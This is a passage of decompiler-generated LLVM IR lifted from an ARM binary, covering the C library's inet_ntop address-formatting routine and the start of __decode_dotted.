  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1257c = load i32, i32* @r5, align 4
  %v7_12588 = icmp eq i32 %arg1, 2
  store i1 %v7_12588, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_12588, label %dec_label_pc_125ac, label %dec_label_pc_125a0

dec_label_pc_125a0:                               ; preds = %entry
  %v7_125a0 = icmp eq i32 %arg1, 10
  store i1 %v7_125a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125a0, label %dec_label_pc_125c0, label %dec_label_pc_127dc

dec_label_pc_125ac:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_125b8 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_127d4

dec_label_pc_125c0:                               ; preds = %dec_label_pc_125a0
  %v2_125c0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_125c0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_125cc = bitcast i32* %stack_var_-72 to i8*
  %v4_125cc = call i32 @__GI_memset(i8* %v3_125cc, i32 0, i32 32)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_125f0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_125d4

dec_label_pc_125d4:                               ; preds = %dec_label_pc_125d4.dec_label_pc_125d4_crit_edge, %dec_label_pc_125c0
  %v0_125ec = phi i32 [ %v0_125d4.pre, %dec_label_pc_125d4.dec_label_pc_125d4_crit_edge ], [ 0, %dec_label_pc_125c0 ]
  %v1_125d4 = load i32, i32* @r8, align 4
  %v2_125d4 = add i32 %v1_125d4, %v0_125ec
  %v3_125d8 = inttoptr i32 %v2_125d4 to i8*
  %v4_125d8 = load i8, i8* %v3_125d8, align 1
  %v6_125d8 = zext i8 %v4_125d8 to i32
  store i32 %v6_125d8, i32* %r1.global-to-local, align 4
  %v1_125dc = add i32 %v2_125d4, 1
  %v2_125dc = inttoptr i32 %v1_125dc to i8*
  %v3_125dc = load i8, i8* %v2_125dc, align 1
  %v4_125dc = zext i8 %v3_125dc to i32
  %tmp74 = icmp slt i32 %v0_125ec, 0
  %v4_125e0 = zext i1 %tmp74 to i32
  %v5_125e0 = add i32 %v4_125e0, %v0_125ec
  %v4_125e4 = mul nuw nsw i32 %v6_125d8, 256
  %v5_125e4 = or i32 %v4_125dc, %v4_125e4
  %v3_125e8 = sdiv i32 %v5_125e0, 2
  %v1_125ec = add i32 %v0_125ec, 2
  store i32 %v1_125ec, i32* %r0.global-to-local, align 4
  store i32 %v2_125f0, i32* %r1.global-to-local, align 4
  %v4_125f4 = mul i32 %v3_125e8, 4
  %v5_125f4 = add i32 %v4_125f4, %v2_125f0
  %v7_125f8 = icmp eq i32 %v1_125ec, 15
  store i1 %v7_125f8, i1* %cpsr_z.global-to-local, align 1
  %v2_125fc = add i32 %v5_125f4, -32
  %v3_125fc = inttoptr i32 %v2_125fc to i32*
  store i32 %v5_125e4, i32* %v3_125fc, align 4
  %v7_12600 = icmp sgt i32 %v1_125ec, 15
  br i1 %v7_12600, label %dec_label_pc_12604, label %dec_label_pc_125d4.dec_label_pc_125d4_crit_edge

dec_label_pc_125d4.dec_label_pc_125d4_crit_edge:  ; preds = %dec_label_pc_125d4
  %v0_125d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125d4

dec_label_pc_12604:                               ; preds = %dec_label_pc_125d4
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %dec_label_pc_12604, %dec_label_pc_12668
  %v0_1265c = phi i32 [ -1, %dec_label_pc_12604 ], [ %v0_12690, %dec_label_pc_12668 ]
  %v0_1264c = phi i32 [ -1, %dec_label_pc_12604 ], [ %v0_1267c, %dec_label_pc_12668 ]
  %v0_12630 = phi i32 [ -1, %dec_label_pc_12604 ], [ %v0_126307, %dec_label_pc_12668 ]
  %v0_12668 = phi i32 [ 0, %dec_label_pc_12604 ], [ %v1_12668, %dec_label_pc_12668 ]
  %v4_12620 = mul nuw nsw i32 %v0_12668, 4
  %v5_12620 = add i32 %v4_12620, %v2_125f0
  %v1_12624 = add i32 %v5_12620, -32
  %v2_12624 = inttoptr i32 %v1_12624 to i32*
  %v3_12624 = load i32, i32* %v2_12624, align 4
  %v2_12628 = icmp eq i32 %v3_12624, 0
  %v7_12630 = icmp eq i32 %v0_12630, -1
  br i1 %v2_12628, label %dec_label_pc_12630, label %dec_label_pc_12644

dec_label_pc_12630:                               ; preds = %dec_label_pc_1261c
  br i1 %v7_12630, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12630
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_12668

.thread:                                          ; preds = %dec_label_pc_12630
  %v1_1263c.pre = load i32, i32* @r4, align 4
  %v2_1263c = add i32 %v1_1263c.pre, 1
  store i32 %v2_1263c, i32* @r4, align 4
  br label %dec_label_pc_12668

dec_label_pc_12644:                               ; preds = %dec_label_pc_1261c
  br i1 %v7_12630, label %dec_label_pc_12668, label %dec_label_pc_1264c

dec_label_pc_1264c:                               ; preds = %dec_label_pc_12644
  %v7_1264c = icmp eq i32 %v0_1264c, -1
  %v0_12660.pre = load i32, i32* @r4, align 4
  %v1_12654 = load i32, i32* @r7, align 4
  %v7_12658 = icmp sgt i32 %v0_12660.pre, %v1_12654
  %or.cond = or i1 %v7_1264c, %v7_12658
  br i1 %or.cond, label %dec_label_pc_1265c, label %dec_label_pc_12664

dec_label_pc_1265c:                               ; preds = %dec_label_pc_1264c
  store i32 %v0_1265c, i32* @r6, align 4
  store i32 %v0_12660.pre, i32* @r7, align 4
  br label %dec_label_pc_12664

dec_label_pc_12664:                               ; preds = %dec_label_pc_1264c, %dec_label_pc_1265c
  %v0_1264c12 = phi i32 [ %v0_1265c, %dec_label_pc_1265c ], [ %v0_1264c, %dec_label_pc_1264c ]
  br label %dec_label_pc_12668

dec_label_pc_12668:                               ; preds = %bb, %.thread, %dec_label_pc_12644, %dec_label_pc_12664
  %v0_12690 = phi i32 [ %v0_1265c, %.thread ], [ %v0_12668, %bb ], [ %v0_1265c, %dec_label_pc_12644 ], [ -1, %dec_label_pc_12664 ]
  %v0_126307 = phi i32 [ %v0_12630, %.thread ], [ %v0_12668, %bb ], [ -1, %dec_label_pc_12644 ], [ -1, %dec_label_pc_12664 ]
  %v0_1267c = phi i32 [ %v0_1264c, %.thread ], [ %v0_1264c, %bb ], [ %v0_1264c, %dec_label_pc_12644 ], [ %v0_1264c12, %dec_label_pc_12664 ]
  %v1_12668 = add nuw nsw i32 %v0_12668, 1
  store i32 %v1_12668, i32* %r1.global-to-local, align 4
  %v7_12670 = icmp slt i32 %v1_12668, 8
  br i1 %v7_12670, label %dec_label_pc_1261c, label %dec_label_pc_12674

dec_label_pc_12674:                               ; preds = %dec_label_pc_12668
  %v7_12674 = icmp eq i32 %v0_12690, -1
  store i1 %v7_12674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12674, label %dec_label_pc_12674.dec_label_pc_12694_crit_edge, label %dec_label_pc_1267c

dec_label_pc_12674.dec_label_pc_12694_crit_edge:  ; preds = %dec_label_pc_12674
  %v1_126b8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12694

dec_label_pc_1267c:                               ; preds = %dec_label_pc_12674
  %v7_1267c = icmp eq i32 %v0_1267c, -1
  store i1 %v7_1267c, i1* %cpsr_z.global-to-local, align 1
  %v0_1268c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1267c, label %dec_label_pc_1268c, label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %dec_label_pc_1267c
  %v1_12684 = load i32, i32* @r7, align 4
  %v9_12684 = icmp eq i32 %v0_1268c.pre, %v1_12684
  store i1 %v9_12684, i1* %cpsr_z.global-to-local, align 1
  %v7_12688 = icmp sgt i32 %v0_1268c.pre, %v1_12684
  br i1 %v7_12688, label %dec_label_pc_1268c, label %dec_label_pc_12694

dec_label_pc_1268c:                               ; preds = %dec_label_pc_1267c, %dec_label_pc_12684
  store i32 %v0_1268c.pre, i32* @r7, align 4
  store i32 %v0_12690, i32* @r6, align 4
  br label %dec_label_pc_12694

dec_label_pc_12694:                               ; preds = %dec_label_pc_12674.dec_label_pc_12694_crit_edge, %dec_label_pc_12684, %dec_label_pc_1268c
  %v1_126b8.pre = phi i32 [ %v1_12684, %dec_label_pc_12684 ], [ %v1_126b8.pre.pre, %dec_label_pc_12674.dec_label_pc_12694_crit_edge ], [ %v0_1268c.pre, %dec_label_pc_1268c ]
  %v0_12694 = phi i32 [ %v0_1267c, %dec_label_pc_12684 ], [ %v0_1267c, %dec_label_pc_12674.dec_label_pc_12694_crit_edge ], [ %v0_12690, %dec_label_pc_1268c ]
  %v7_12694 = icmp eq i32 %v0_12694, -1
  store i1 %v7_12694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12694, label %dec_label_pc_12694._crit_edge, label %dec_label_pc_1269c

dec_label_pc_1269c:                               ; preds = %dec_label_pc_12694
  %v7_1269c = icmp eq i32 %v1_126b8.pre, 1
  store i1 %v7_1269c, i1* %cpsr_z.global-to-local, align 1
  %v7_126a0 = icmp slt i32 %v1_126b8.pre, 2
  br i1 %v7_126a0, label %bb54, label %dec_label_pc_12694._crit_edge

bb54:                                             ; preds = %dec_label_pc_1269c
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_12694._crit_edge

dec_label_pc_12694._crit_edge:                    ; preds = %dec_label_pc_12694, %dec_label_pc_1269c, %bb54
  %v0_126b8 = phi i32 [ %v0_12694, %dec_label_pc_1269c ], [ -1, %bb54 ], [ %v0_12694, %dec_label_pc_12694 ]
  %v2_126a8 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_126a8, i32* @r4, align 4
  %v0_126ac = load i32, i32* @r5, align 4
  %v2_126ac = add i32 %v0_126ac, -37200
  store i32 %v2_126ac, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_126b8 = add i32 %v0_126b8, %v1_126b8.pre
  store i32 %v2_126b8, i32* @sl, align 4
  %v9_12718 = icmp eq i32 %tmp, 65535
  %v7_126c068 = icmp eq i32 %v0_126b8, -1
  store i1 %v7_126c068, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_126c0

dec_label_pc_126c0:                               ; preds = %dec_label_pc_12694._crit_edge, %dec_label_pc_12770
  %v7_126c072 = phi i1 [ %v7_126c068, %dec_label_pc_12694._crit_edge ], [ %v7_126c0, %dec_label_pc_12770 ]
  %v0_126ec71 = phi i32 [ 0, %dec_label_pc_12694._crit_edge ], [ %v1_12770, %dec_label_pc_12770 ]
  %v1_126d870 = phi i32 [ %v0_126b8, %dec_label_pc_12694._crit_edge ], [ %v0_126c0.pre, %dec_label_pc_12770 ]
  %v2_126f069 = phi i32 [ %v2_126a8, %dec_label_pc_12694._crit_edge ], [ %v3_126dc29, %dec_label_pc_12770 ]
  br i1 %v7_126c072, label %dec_label_pc_126e4, label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %dec_label_pc_126c0
  %v9_126c8 = icmp eq i32 %v0_126ec71, %v1_126d870
  store i1 %v9_126c8, i1* %cpsr_z.global-to-local, align 1
  %v5_126cc = icmp slt i32 %v0_126ec71, %v1_126d870
  br i1 %v5_126cc, label %dec_label_pc_126e4, label %dec_label_pc_126d0

dec_label_pc_126d0:                               ; preds = %dec_label_pc_126c8
  %v1_126d0 = load i32, i32* @sl, align 4
  %v9_126d0 = icmp eq i32 %v0_126ec71, %v1_126d0
  store i1 %v9_126d0, i1* %cpsr_z.global-to-local, align 1
  %v6_126d4 = icmp slt i32 %v0_126ec71, %v1_126d0
  br i1 %v6_126d4, label %dec_label_pc_126d8, label %dec_label_pc_126e4

dec_label_pc_126d8:                               ; preds = %dec_label_pc_126d0
  store i1 %v9_126c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_126c8, label %bb56, label %dec_label_pc_12770

bb56:                                             ; preds = %dec_label_pc_126d8
  %v1_126dc = load i32, i32* @sb, align 4
  %v2_126dc = trunc i32 %v1_126dc to i8
  %v4_126dc = inttoptr i32 %v2_126f069 to i8*
  store i8 %v2_126dc, i8* %v4_126dc, align 1
  %v5_126dc = load i32, i32* @r4, align 4
  %v6_126dc = add i32 %v5_126dc, 1
  store i32 %v6_126dc, i32* @r4, align 4
  br label %dec_label_pc_12770

dec_label_pc_126e4:                               ; preds = %dec_label_pc_126d0, %dec_label_pc_126c8, %dec_label_pc_126c0
  %v2_126e4 = icmp eq i32 %v0_126ec71, 0
  store i1 %v2_126e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_126e4, label %dec_label_pc_12754, label %dec_label_pc_126ec

dec_label_pc_126ec:                               ; preds = %dec_label_pc_126e4
  %v7_126ec = icmp eq i32 %v0_126ec71, 6
  store i1 %v7_126ec, i1* %cpsr_z.global-to-local, align 1
  %v0_126f0 = load i32, i32* @sb, align 4
  %v1_126f0 = trunc i32 %v0_126f0 to i8
  %v3_126f0 = inttoptr i32 %v2_126f069 to i8*
  store i8 %v1_126f0, i8* %v3_126f0, align 1
  %v4_126f0 = load i32, i32* @r4, align 4
  %v5_126f0 = add i32 %v4_126f0, 1
  store i32 %v5_126f0, i32* @r4, align 4
  %v0_126f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_126f4, label %dec_label_pc_126f8, label %dec_label_pc_12754

dec_label_pc_126f8:                               ; preds = %dec_label_pc_126ec
  %v0_126f8 = load i32, i32* @r6, align 4
  %v2_126f8 = icmp eq i32 %v0_126f8, 0
  store i1 %v2_126f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_126f8, label %dec_label_pc_12700, label %dec_label_pc_12754

dec_label_pc_12700:                               ; preds = %dec_label_pc_126f8
  %v0_12700 = load i32, i32* @r7, align 4
  %v7_12700 = icmp eq i32 %v0_12700, 6
  store i1 %v7_12700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12700, label %dec_label_pc_12720, label %dec_label_pc_12708

dec_label_pc_12708:                               ; preds = %dec_label_pc_12700
  %v7_12708 = icmp eq i32 %v0_12700, 5
  store i1 %v7_12708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12708, label %dec_label_pc_12710, label %dec_label_pc_12754

dec_label_pc_12710:                               ; preds = %dec_label_pc_12708
  store i32 65535, i32* %r1.global-to-local, align 4
  store i1 %v9_12718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12718, label %dec_label_pc_12720, label %dec_label_pc_12754

dec_label_pc_12720:                               ; preds = %dec_label_pc_12710, %dec_label_pc_12700
  %v2_12724 = sub i32 %v2_125f0, %v5_126f0
  store i32 %v5_126f0, i32* %r1.global-to-local, align 4
  %v0_1272c = load i32, i32* @r8, align 4
  %v1_1272c = add i32 %v0_1272c, 12
  store i32 %v1_1272c, i32* %r0.global-to-local, align 4
  %v1_12730 = add i32 %v2_12724, -32
  %v3_12734 = call i32 @inet_ntop4(i32 %v1_1272c, i32 %v5_126f0, i32 %v1_12730)
  store i32 %v3_12734, i32* %r0.global-to-local, align 4
  %v2_12738 = icmp eq i32 %v3_12734, 0
  store i1 %v2_12738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12738, label %bb57, label %dec_label_pc_12744

bb57:                                             ; preds = %dec_label_pc_12720
  %v1_1273c = load i32, i32* @r6, align 4
  store i32 %v1_1273c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127f4

dec_label_pc_12744:                               ; preds = %dec_label_pc_12720
  %v0_12744 = load i32, i32* @r4, align 4
  %v1_12744 = inttoptr i32 %v0_12744 to i8*
  store i32 %v0_12744, i32* %r0.global-to-local, align 4
  %v3_12748 = call i32 @strlen(i8* %v1_12744)
  store i32 %v3_12748, i32* %r0.global-to-local, align 4
  %v0_1274c = load i32, i32* @r4, align 4
  %v2_1274c = add i32 %v0_1274c, %v3_12748
  store i32 %v2_1274c, i32* @r4, align 4
  %v0_12784.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12784

dec_label_pc_12754:                               ; preds = %dec_label_pc_12710, %dec_label_pc_12708, %dec_label_pc_126f8, %dec_label_pc_126ec, %dec_label_pc_126e4
  %v0_1275c = phi i32 [ %v5_126f0, %dec_label_pc_12710 ], [ %v5_126f0, %dec_label_pc_12708 ], [ %v5_126f0, %dec_label_pc_126f8 ], [ %v5_126f0, %dec_label_pc_126ec ], [ %v2_126f069, %dec_label_pc_126e4 ]
  store i32 %v2_125f0, i32* @lr, align 4
  %v1_12758 = load i32, i32* @r5, align 4
  %v4_12758 = mul i32 %v1_12758, 4
  %v5_12758 = add i32 %v4_12758, %v2_125f0
  store i32 %v0_1275c, i32* @r0, align 4
  %v1_12760 = add i32 %v5_12758, -32
  %v2_12760 = inttoptr i32 %v1_12760 to i32*
  %v3_12760 = load i32, i32* %v2_12760, align 4
  %v0_12764 = load i32, i32* @fp, align 4
  store i32 %v0_12764, i32* %r1.global-to-local, align 4
  %v4_12768 = call i32 @sprintf(i32 %v0_1275c, i32 %v0_12764, i32 %v3_12760, i32 %v5_12758)
  store i32 %v4_12768, i32* %r0.global-to-local, align 4
  %v0_1276c = load i32, i32* @r4, align 4
  %v2_1276c = add i32 %v0_1276c, %v4_12768
  store i32 %v2_1276c, i32* @r4, align 4
  br label %dec_label_pc_12770

dec_label_pc_12770:                               ; preds = %bb56, %dec_label_pc_126d8, %dec_label_pc_12754
  %v3_126dc29 = phi i32 [ %v6_126dc, %bb56 ], [ %v2_126f069, %dec_label_pc_126d8 ], [ %v2_1276c, %dec_label_pc_12754 ]
  %v0_12770 = load i32, i32* @r5, align 4
  %v1_12770 = add i32 %v0_12770, 1
  store i32 %v1_12770, i32* @r5, align 4
  %v0_126c0.pre = load i32, i32* @r6, align 4
  %v7_12778 = icmp slt i32 %v1_12770, 8
  %v7_126c0 = icmp eq i32 %v0_126c0.pre, -1
  store i1 %v7_126c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12778, label %dec_label_pc_126c0, label %dec_label_pc_1277c

dec_label_pc_1277c:                               ; preds = %dec_label_pc_12770
  br i1 %v7_126c0, label %.thread2, label %dec_label_pc_12784

dec_label_pc_12784:                               ; preds = %dec_label_pc_1277c, %dec_label_pc_12744
  %v3_12790 = phi i32 [ %v3_126dc29, %dec_label_pc_1277c ], [ %v2_1274c, %dec_label_pc_12744 ]
  %v0_12784 = phi i32 [ %v0_126c0.pre, %dec_label_pc_1277c ], [ %v0_12784.pre, %dec_label_pc_12744 ]
  %v1_12784 = load i32, i32* @r7, align 4
  %v2_12784 = add i32 %v1_12784, %v0_12784
  %v7_12788 = icmp eq i32 %v2_12784, 8
  store i1 %v7_12788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12788, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_12784
  %v4_12790 = inttoptr i32 %v3_12790 to i8*
  store i8 58, i8* %v4_12790, align 1
  %v5_12790 = load i32, i32* @r4, align 4
  %v6_12790 = add i32 %v5_12790, 1
  store i32 %v6_12790, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12784, %dec_label_pc_1277c, %bb58
  %v2_12798 = phi i32 [ %v3_12790, %dec_label_pc_12784 ], [ %v3_126dc29, %dec_label_pc_1277c ], [ %v6_12790, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_12798 = inttoptr i32 %v2_12798 to i8*
  store i8 0, i8* %v3_12798, align 1
  %v4_12798 = load i32, i32* @r4, align 4
  %v5_12798 = add i32 %v4_12798, 1
  store i32 %v2_126a8, i32* @r1, align 4
  %v2_127a0 = load i32, i32* %stack_var_-128, align 4
  %v2_127a4 = sub i32 %v5_12798, %v2_126a8
  %v9_127a8 = icmp eq i32 %v2_127a4, %v2_127a0
  store i1 %v9_127a8, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_127a4, %v2_127a0
  br i1 %tmp75, label %dec_label_pc_127b0, label %dec_label_pc_127cc

dec_label_pc_127b0:                               ; preds = %.thread2
  %v0_127b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_127b4, i32* %r0.global-to-local, align 4
  %v3_127b8 = load i16, i16* @global_var_222f0.75, align 2
  %v4_127b8 = sext i16 %v3_127b8 to i32
  %v0_127c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_127c0, i32* %r1.global-to-local, align 4
  %v3_127c4 = add i32 %v4_127b8, %v0_127b4
  %v4_127c4 = inttoptr i32 %v3_127c4 to i32*
  store i32 28, i32* %v4_127c4, align 4
  %v0_127f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127f4

dec_label_pc_127cc:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_127d0 = inttoptr i32 %arg3 to i8*
  %v3_127d0 = call i32 @strcpy(i8* %v2_127d0, i32 %v2_126a8)
  br label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_125ac, %dec_label_pc_127cc
  %storemerge = phi i32 [ %v3_125b8, %dec_label_pc_125ac ], [ %v3_127d0, %dec_label_pc_127cc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127f4

dec_label_pc_127dc:                               ; preds = %dec_label_pc_125a0
  %v0_127e0 = call i32 @__aeabi_read_tp()
  store i32 %v0_127e0, i32* %r0.global-to-local, align 4
  %v3_127e4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_127e4 = sext i16 %v3_127e4 to i32
  %v3_127ec = add i32 %v4_127e4, %v0_127e0
  %v4_127ec = inttoptr i32 %v3_127ec to i32*
  store i32 97, i32* %v4_127ec, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %bb57, %dec_label_pc_127d4, %dec_label_pc_127b0, %dec_label_pc_127dc
  %v0_127f4 = phi i32 [ %v1_1273c, %bb57 ], [ %storemerge, %dec_label_pc_127d4 ], [ %v0_127f4.pre, %dec_label_pc_127b0 ], [ 0, %dec_label_pc_127dc ]
  store i32 %v0_127f4, i32* %r0.global-to-local, align 4
  store i32 %v6_1257c, i32* %r5.global-to-local, align 4
  ret i32 %v0_127f4

; uselistorder directives
  uselistorder i32 %v0_127f4, { 1, 0 }
  uselistorder i1 %v7_126c0, { 2, 0, 1 }
  uselistorder i32 %v0_126c0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_12770, { 0, 2, 1 }
  uselistorder i32 %v0_1275c, { 1, 0 }
  uselistorder i32 %v0_12744, { 1, 0 }
  uselistorder i32 %v5_126f0, { 3, 4, 5, 6, 2, 1, 0, 7 }
  uselistorder i1 %v9_126c8, { 1, 0, 2 }
  uselistorder i32 %v2_126f069, { 0, 3, 2, 1 }
  uselistorder i32 %v0_126ec71, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_126c068, { 1, 0 }
  uselistorder i32 %v2_126a8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_126b8, { 1, 0, 2 }
  uselistorder i1 %v7_12694, { 1, 0 }
  uselistorder i32 %v0_12694, { 1, 2, 0 }
  uselistorder i32 %v1_126b8.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1268c.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1267c, { 1, 0 }
  uselistorder i1 %v7_12674, { 1, 0 }
  uselistorder i32 %v1_12668, { 1, 2, 0 }
  uselistorder i32 %v0_1267c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12690, { 1, 2, 0, 3 }
  uselistorder i1 %v7_12630, { 1, 0 }
  uselistorder i32 %v0_12668, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1264c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1265c, { 3, 1, 0, 2 }
  uselistorder i32 %v1_125ec, { 1, 0, 2 }
  uselistorder i32 %v2_125d4, { 1, 0 }
  uselistorder i32 %v0_125ec, { 3, 1, 0, 2 }
  uselistorder i32 %v2_125f0, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 6, 8, 7, 13, 9, 10, 11, 12, 14, 15, 16, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 15, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 3, 16, 17, 18, 19, 20, 2, 21, 22, 23 }
  uselistorder i8 58, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_127f4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_127d4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126c0, { 1, 0 }
  uselistorder label %dec_label_pc_12694._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12694, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1268c, { 1, 0 }
  uselistorder label %dec_label_pc_12668, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12664, { 1, 0 }
  uselistorder label %dec_label_pc_1261c, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_12818 = load i32, i32* @r5, align 4
  %v0_1281c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1281c, i32* %sl.global-to-local, align 4
  %v2_1281c = icmp eq i32 %v0_1281c, 0
  br i1 %v2_1281c, label %.thread30, label %dec_label_pc_12844.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12904

dec_label_pc_12844.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_128444 = load i32, i32* @r1, align 4
  %v6_1284814 = icmp slt i32 %v0_128444, %arg2
  br i1 %v6_1284814, label %dec_label_pc_1284c.preheader, label %dec_label_pc_12904

dec_label_pc_1284c.preheader:                     ; preds = %dec_label_pc_12844.preheader
  %v2_1284c51 = add i32 %v0_1281c, %v0_128444
  %v3_1284c52 = inttoptr i32 %v2_1284c51 to i8*
  %v4_1284c53 = load i8, i8* %v3_1284c52, align 1
  %v6_1284c54 = zext i8 %v4_1284c53 to i32
  store i32 %v6_1284c54, i32* @r4, align 4
  %v2_1285055 = icmp eq i8 %v4_1284c53, 0
  br i1 %v2_1285055, label %bb49, label %dec_label_pc_12858

dec_label_pc_12840:                               ; preds = %bb48, %bb44
  %v1_12844 = phi i32 [ %v1_12844.pre, %bb48 ], [ %v1_1287059, %bb44 ]
  %v0_12844 = phi i32 [ %v0_12844.pre, %bb48 ], [ %v5_12888, %bb44 ]
  %v0_12840 = phi i32 [ %v0_12840.pre, %bb48 ], [ %v0_1288c60, %bb44 ]
  store i32 %v0_12840, i32* %r0.global-to-local, align 4
  %v6_12848 = icmp slt i32 %v0_12844, %v1_12844
  br i1 %v6_12848, label %dec_label_pc_12840.dec_label_pc_1284c_crit_edge, label %dec_label_pc_12904

dec_label_pc_12840.dec_label_pc_1284c_crit_edge:  ; preds = %dec_label_pc_12840
  %v0_1284c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1284c = add i32 %v0_1284c.pre, %v0_12844
  %v3_1284c = inttoptr i32 %v2_1284c to i8*
  %v4_1284c = load i8, i8* %v3_1284c, align 1
  %v6_1284c = zext i8 %v4_1284c to i32
  store i32 %v6_1284c, i32* @r4, align 4
  %v2_12850 = icmp eq i8 %v4_1284c, 0
